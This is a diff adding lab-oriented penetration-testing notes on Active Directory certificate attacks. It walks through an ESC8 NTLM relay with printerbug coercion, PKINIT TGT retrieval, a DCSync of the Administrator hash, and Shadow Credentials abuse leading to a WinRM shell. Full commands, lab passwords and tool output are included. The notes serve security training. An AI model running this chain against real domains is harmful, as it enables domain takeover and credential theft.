@@ -177,6 +177,10 @@
       - [Evil-WinRM](#evil-winrm-1)
       - [Misc](#misc)
       - [Linikatz](#linikatz)
+    - [Pass the Certificate](#pass-the-certificate)
+      - [AD CS NTLM Relay Attack (_ESC_)](#ad-cs-ntlm-relay-attack-esc)
+      - [Shadow Credentials](#shadow-credentials)
+      - [No PKINIT?](#no-pkinit)
 
 ---
 
@@ -4649,4 +4653,177 @@ Valid starting       Expires              Service principal
     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
 I: [check] KCM Kerberos tickets
 ```
+
+### Pass the Certificate
+
+PKINIT (_Public Key Cryptography for Initial Authentication_) is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. PtC refers to the technique of using X.509 certificates to successfully obtain TGTs. This method is used primarily alongside attacks against AD Certificate Services, as well as in Shadow Credential attacks.
+
+#### AD CS NTLM Relay Attack (_ESC_)
+
+ESC8 is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, including web enrollment, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at ```/Certsrv```:
+
+![password attacks 8](../../images/password_attacks_8.png)
+
+Attackers can use Impacket's ntlmrelayx to listen for inbound connections and relay them to the web enrollment service using the following command:
+
+```bash
+d41y@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug. This attack requires the targeted machine account to have the Printer Spooler service running. The command below forces 10.129.234.109 to attempt authentication against 10.10.16.12:
+
+```bash
+d41y@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+
+[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
+[*] Bind OK
+[*] Got handle
+RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
+[*] Triggered RPC backconnect, this may or may not have worked
+```
+
+Referring back to ntlmrelayx, you can see from the output that the authentication request was successfully relayed to the web enrollment applicatino, and a certificate was issued for DC01$.
+
+```bash
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
+[*] HTTP server returned error code 404, treating as a successful login
+[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
+[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
+[-] Authenticating against http://10.129.234.110 as / FAILED
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE! ID 8
+[*] Writing PKCS#12 certificate to ./DC01$.pfx
+[*] Certificate successfully written to file
+```
+
+You can now perform a PtC attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).
+
+```bash
+d41y@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+
+2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
+INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
+2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+
+Once you successfully obtain a TGT, you're back in familiar PtT territory. As the DC's machine account, you can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:
+
+```bash
+d41y@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
+d41y@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
+<SNIP>
+```
+
+#### Shadow Credentials
+
+... refers to an AD attack that abuses the msDS-KeyCredentialLink attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the AddKeyCredentialLink edge indicates that one user has write permissions over another user's msDS-KeyCredentialLink attribute, allowing them to take control of that user.
+
+You can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an X.509 certificate and writes the public key to the victim user's msDS-KeyCredentialLink attribute.
+
+```bash
+d41y@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+[*] Searching for the target account
+[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
+[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
+[+] PFX exportiert nach: eFUVVTPf.pfx
+[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
+[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
+[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+In the output above, you can see that a PFX (_PKCS12_) file was created, and the password is shown. You will use this file with gettgtpkinit.py to acquire a TGT as the victim:
+
+```bash
+d41y@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
+INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
+2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+
+With the TGT obtained, you may once again PtT:
+
+```bash
+d41y@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
+d41y@htb[/htb]$ klist
+
+Ticket cache: FILE:/tmp/jpinkman.ccache
+Default principal: jpinkman@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+```
+
+In this case, you discovered that the victim user is a member of the Remote Management Users group, which permits them to connect to the machine via WinRM.
+
+```bash
+d41y@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
+inlanefreight\jpinkman
+```
+
+#### No PKINIT?
+
+In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks.
 
